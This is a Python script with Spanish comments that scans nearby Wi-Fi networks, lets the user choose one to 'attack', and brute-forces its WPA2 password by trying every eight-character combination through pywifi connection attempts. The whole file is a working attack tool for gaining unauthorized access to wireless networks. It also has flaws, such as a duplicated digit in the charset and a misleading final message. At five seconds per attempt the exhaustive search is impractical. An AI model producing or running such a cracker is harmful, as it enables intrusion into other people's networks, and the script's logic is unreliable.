import pywifi
import itertools
import time
from pywifi import const
# Nomenclatura Contraseñas
charset = "01234567890aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ"
# Ver Redes
def wifi_scan():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    try:
        interface.scan()  
        time.sleep(2) 
        print("\nRedes Wi-Fi disponibles:")
        networks = interface.scan_results()
        if not networks:
            print("No se encontraron redes Wi-Fi.")
            return []
        # Mostrar Redes Y Señal
        for idx, network in enumerate(networks):
            print(f"{idx + 1}. SSID: {network.ssid}, Señal: {network.signal} dBm")
        return networks
    except Exception as e:
        print(f"Error al escanear redes Wi-Fi: {e}")
        return []
# Función Crackeadora
def wifi_password_crack(wifi_name):
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    password_combinations = itertools.product(charset, repeat=8)
    # Función Probar Contraseña
    def try_password(password_tuple):
        password = ''.join(password_tuple)  
        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.remove_all_network_profiles()  
        tmp_profile = interface.add_network_profile(profile)
        # Conector
        interface.connect(tmp_profile)
        start_time = time.time()
        # Verificador
        while time.time() - start_time < 5:
            if interface.status() == const.IFACE_CONNECTED:
                print(f"\n¡Conexión exitosa! La contraseña es: {password}")
                return True
            time.sleep(0.5)
        # Desconecta Si No Es Correcta
        interface.disconnect()
        return False
    # Generador
    for password_tuple in password_combinations:
        password = ''.join(password_tuple)  
        print(f"Probando: {password}")  
        if try_password(password_tuple):  
            break
    else:
        print("Contraseña del router cambiada")
def main():
    networks = wifi_scan()
    if networks:
        try:
            choice = int(input("\nSeleccione el número de la red Wi-Fi que desea atacar: "))
            if 1 <= choice <= len(networks):
                wifi_name = networks[choice - 1].ssid  
                print(f"\nHas seleccionado la red: {wifi_name}")
                wifi_password_crack(wifi_name) 
            else:
                print("Número de red no válido.")
        except ValueError:
            print("Por favor, ingresa un número válido.")
    else:
        print("No se encontraron redes Wi-Fi disponibles.")
if __name__ == "__main__":
    main()